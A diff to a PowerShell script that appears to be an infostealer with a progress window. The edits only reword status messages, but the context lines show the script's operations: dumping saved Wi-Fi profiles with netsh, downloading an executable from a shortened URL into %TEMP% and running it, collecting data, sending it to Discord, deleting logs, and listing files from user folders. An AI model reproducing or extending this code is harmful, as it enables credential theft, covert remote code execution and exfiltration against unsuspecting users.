@@ -123,7 +123,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
     switch ($step) {
         1 {
             # Operation 1 - Extract Wi-Fi profiles
-            $textBlock.Text = "Extracting WhyFigh Profiles operations..."
+            $textBlock.Text = "Starting Operation 1..."
             try {
                 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
                     $wlan = $_.Matches.Value
@@ -157,11 +157,10 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                 [System.Windows.MessageBox]::Show("An error occurred: $($_.Exception.Message)", 'Error')
             }
             $textBlock.Text = "Extracted!"
+            $textBlock.Text = "Starting operation 2..."
             # Write-Output "Completed Operation 1 - NETSH"
         }
         2 {
-            $textBlock.Text = "Starting operation 2..."
-
             # Operation 2
             $url = "https://lnkfwd.com/u/Kpj_Yric"  # Define the URL of the file to be downloaded
             $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
@@ -187,12 +186,12 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             $process = Start-Process $tempExePath # Start the executable
 
             $textBlock.Text = "Done operation 2!"
+            $textBlock.Text = "Starting operation 3..."
 
             # Write-Output "Completed Operation 2"
         }
         3 {
             # Operation 3 - EXTRACT DATA 
-            $textBlock.Text = "Starting operation 3..."
 
             $outputFilePath = "$env:TEMP\data.txt"
             Start-Sleep -Seconds 2 # Wait a moment for the application to fully load
@@ -213,12 +212,11 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes
 
             $textBlock.Text = "Done operation 3"
-
+            $textBlock.Text = "Starting operation 4..."
             # Write-Output "Completed Operation 3 - EXTRACT DATA"
         }
         4 {
             # Operation 4 - SEND TO DISCORD
-            $textBlock.Text = "Starting operation 4..."
 
             $filePath = "$env:TEMP\data.txt" # Define the path to the text file using the TEMP environment variable
 
@@ -264,12 +262,10 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue
 
             $textBlock.Text = "Done operation 4..."
-
+            $textBlock.Text = "Starting last operation ..."
             # Write-Output "Completed Operation 4 - CRED done"
         }
         5 {
-            $textBlock.Text = "Starting last operation ..."
-
             #Operation 5 - TREE Files Extract
             # Define the folders to search
             $folders = @(
@@ -410,4 +406,4 @@ Stop-Transcript
 # Write-Output "All operations completed!"
 # Display a message box indicating completion
 Add-Type -AssemblyName PresentationFramework
-[System.Windows.MessageBox]::Show('All operations completed!', 'Notification')
+[System.Windows.MessageBox]::Show("All operations completed!", "Success", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
